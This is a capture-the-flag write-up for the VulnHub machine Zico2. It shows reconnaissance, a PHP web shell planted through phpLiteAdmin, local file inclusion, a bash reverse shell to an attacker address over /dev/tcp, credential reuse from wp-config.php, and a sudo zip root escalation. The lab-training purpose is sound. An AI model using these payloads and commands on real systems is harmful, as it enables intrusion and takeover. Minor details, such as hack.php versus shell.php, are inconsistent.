## Zico2 VulnHub Writeup

### Overview

Zico2 is a VulnHub machine that involves network reconnaissance, web application analysis (phpLiteAdmin), SQL injection, and privilege escalation. This writeup details the steps taken to gain root access and retrieve the final flag.

### Reconnaissance

#### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target machine was identified at `192.168.1.23` with MAC Address `08:00:27:0A:A8:94` (PCS Systemtechnik GmbH).

Next, I performed a port scan using `nmap` to identify open services and their versions:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.23 -p-
```

**Results:**

- 22/tcp: `ssh` OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
- 80/tcp: `http` Apache httpd 2.2.22 ((Ubuntu))
- 111/tcp: `rpcbind` 2-4 (RPC `#100000`)
- 55904/tcp: `status` 1 (RPC `#100024`)


### Web Enumeration (Port 80)

I used `gobuster` to enumerate directories and files on the web server running on port 80:

```shellscript
gobuster dir -u http://192.168.1.23/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

**Results:**

- /index (Status: 200)
- /img (Status: 301)
- /css (Status: 301)
- /js (Status: 301)
- /tools (Status: 200)
- /vendor (Status: 301)
- /view (Status: 200)
- /package (Status: 200)
- /LICENSE (Status: 200)
- /less (Status: 301)
- /server-status (Status: 403)
- /dbadmin (Status: 301)


### phpLiteAdmin Access

The `/dbadmin` directory looked interesting. Navigating to `http://192.168.1.23/dbadmin/` revealed a phpLiteAdmin login page.

I attempted to log in using the default credentials "admin" for both username and password, which was successful.

### Exploiting phpLiteAdmin

I explored the phpLiteAdmin interface and found a way to execute PHP code.

<img width="1123" height="620" alt="image" src="https://github.com/user-attachments/assets/e7be473f-28aa-423f-acb7-3788518de955" />

This screenshot shows the phpLiteAdmin v1.9.3 interface, displaying the `test_users` database with `root` and `zico` entries, including their hashed passwords. This indicates successful access to the database.

I created a new database named `hack.php`. Then, I created a table named `test` within this database and inserted a text field with the default value:

```php
<?php system($_GET["cmd"]); ?>
```

<img width="1311" height="459" alt="image" src="https://github.com/user-attachments/assets/7838ba9d-a400-428f-875b-04a17584eb85" />


This screenshot shows the phpLiteAdmin interface confirming that `Table 'test' has been created` within the `/usr/databases/hack.php` database. The `CREATE TABLE` statement includes the PHP code `<?php system($_GET["cmd"]); ?>` as a default value, which will allow for command execution.

This allowed me to execute arbitrary commands via the `cmd` parameter in the URL. For example, I could view `/etc/passwd` using Local File Inclusion (LFI):

<img width="1337" height="224" alt="image" src="https://github.com/user-attachments/assets/91c0c03a-a03c-4173-9590-3c8057c17689" />


This screenshot shows the browser displaying the content of `/etc/passwd` after navigating to `zico.local/view.php?page=../../../../etc/passwd`, demonstrating a successful Local File Inclusion vulnerability.

I also gathered information about the PHP version:

<img width="1191" height="677" alt="image" src="https://github.com/user-attachments/assets/aa152462-0d95-404a-8241-d864e70fc175" />


This screenshot displays the PHP Version 5.3.10-1ubuntu3.26 information page, showing details like the system, build date, server API, and loaded configuration files.

### Reverse Shell

I set up a `netcat` listener on my attacking machine (Kali Linux) on port 4444:

```shellscript
nc -lnvp 4444
```

Then, I triggered a reverse shell by navigating to the `hack.php` database file with a `cmd` parameter containing a reverse shell command. The URL looked something like this:

```plaintext
http://192.168.1.23/dbadmin/test_db.php?action=table_create&confirm=1
```

<img width="1366" height="678" alt="image" src="https://github.com/user-attachments/assets/1b370b0d-243d-4696-a1d9-f5d5d63e3859" />


This screenshot shows the phpLiteAdmin interface confirming that a table has been created within `/usr/databases/hack.php`. The `CREATE TABLE` statement includes a PHP reverse shell command, indicating that the shell code has been successfully injected into the database.

The final URL used to trigger the reverse shell was:

```plaintext
http://zico.local/view.php?page=../../../../usr/databases/hack.php
```

<img width="678" height="99" alt="image" src="https://github.com/user-attachments/assets/d7dab586-22d2-42db-b360-d8f6dcc3cf57" />


This screenshot shows the browser's address bar with the URL `zico.local/view.php?page=../../../../usr/databases/shell.php?cmd=/bin/bash -i >& /dev/tcp/192.168.1.6/4444 0>&1`, which is used to execute the reverse shell by leveraging the LFI and the injected PHP code.

I received a reverse shell on my `netcat` listener as the `www-data` user:

```plaintext
Linux zico 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

I then upgraded to a proper TTY shell for better interaction:

```shellscript
python -c "import pty;pty.spawn('/bin/bash')"
```

### Privilege Escalation

I explored the system and found a user named `zico`. I then examined the `wp-config.php` file in the `/home/zico/wordpress` directory to find the database credentials for the WordPress installation:

```shellscript
cat /home/zico/wordpress/wp-config.php
```

**Database credentials found:**

```php
define('DB_NAME', 'zico');
define('DB_USER', 'zico');
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');
```

I used these credentials to switch user to `zico`:

```shellscript
su zico
```

Password: `sWfCsfJSPV9H3AmQzw8`

After switching to the `zico` user, I checked the sudo permissions:

```shellscript
sudo -l
```

**Sudo permissions:**

```plaintext
User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```

The user `zico` could run `/usr/bin/zip` as root without a password. This is a privilege escalation vulnerability.

I exploited this vulnerability to gain root access:

```shellscript
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

This command created a zip archive and then executed a shell as root.

```shellscript
id
```

uid=0(root) gid=0(root) groups=0(root)

### Root Flag

Finally, I navigated to the `/root` directory to find the `flag.txt` file.

```shellscript
cd /root
cat flag.txt
```

**Root Flag:**

```plaintext
#### ROOOOT! ####
You did it! Congratz!
Hope you enjoyed!
###
```

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service version detection
- `gobuster` - Directory and file enumeration
- `phpLiteAdmin` - SQLite database administration
- `netcat` - Setting up listeners for reverse shells
- `php` - Executing PHP code
- `sudo` - Privilege escalation
- `zip` - Exploiting SUID binary for privilege escalation


## Flags Found

1. **User Credentials:**

1. User: zico
2. Pass: sWfCsfJSPV9H3AmQzw8



2. **Root Flag:** ROOOOT! You did it! Congratz! Hope you enjoyed!
